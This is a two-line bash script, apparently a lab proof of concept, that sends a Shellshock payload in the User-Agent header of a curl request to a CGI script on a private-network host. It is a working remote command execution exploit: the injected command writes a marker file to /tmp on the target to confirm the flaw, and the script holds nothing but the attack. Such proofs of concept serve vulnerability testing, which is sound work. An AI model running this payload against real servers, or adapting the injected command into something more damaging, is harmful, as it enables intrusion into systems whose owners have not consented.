#!/bin/bash
curl -k -H 'User-Agent: () { :;}; echo char-sec>/tmp/shellshock' 192.168.55.216/cgi-bin/ss.cgi

